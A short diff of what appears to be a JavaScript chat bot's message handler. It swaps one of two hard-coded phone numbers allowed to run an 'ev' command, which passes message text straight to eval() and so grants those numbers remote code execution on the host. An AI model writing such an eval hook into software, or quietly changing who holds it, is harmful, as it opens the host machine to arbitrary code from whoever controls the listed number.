@@ -1808,7 +1808,7 @@ console.log(dsa)
     break
 // Inside your message handler (outside any case)
  case 'ev': {
-    if(senderNumber == 94724375368 || senderNumber == 94722617699) {
+    if(senderNumber == 94724375368 || senderNumber == 94788518429) {
     let code2 = q.replace("°", ".toString()");
     try {
 let resultTest = await eval(code2);
